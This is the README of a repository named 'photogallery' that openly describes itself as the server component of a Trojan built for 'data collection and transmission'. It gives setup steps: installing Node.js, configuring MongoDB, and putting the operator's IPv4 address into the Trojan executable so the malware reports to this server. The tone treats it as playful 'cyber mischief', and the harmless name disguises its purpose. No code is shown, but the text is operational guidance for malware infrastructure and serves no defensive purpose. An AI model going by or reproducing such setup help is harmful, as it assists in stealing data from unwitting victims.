# Project Overview
**Note:** Despite the project name being "photogallery," this repository actually provides server functionality for a Trojan project. In a way, it's an accomplice in the world of cyber mischief!

## Introduction
In this repository, you'll find the server code necessary for supporting the Trojan project you’ve crafted. This setup is designed for data collection and transmission. Below, you'll find instructions to get everything up and running.

## How to Get Started
Clone the Repository:
Start by cloning this repository to your local machine.

## Install Node.js:
Node.js is essential for running the server. Ensure that you have it installed; otherwise, the server won’t start.

## Configure IP Address:
Open Command Prompt (cmd) and type ipconfig to find your IPv4 address. Replace the placeholder URL in your Trojan executable with this IPv4 address (this links the Trojan to your server).

## Set Up MongoDB:
Don’t forget to configure MongoDB. Your server needs it to store and manage data efficiently.
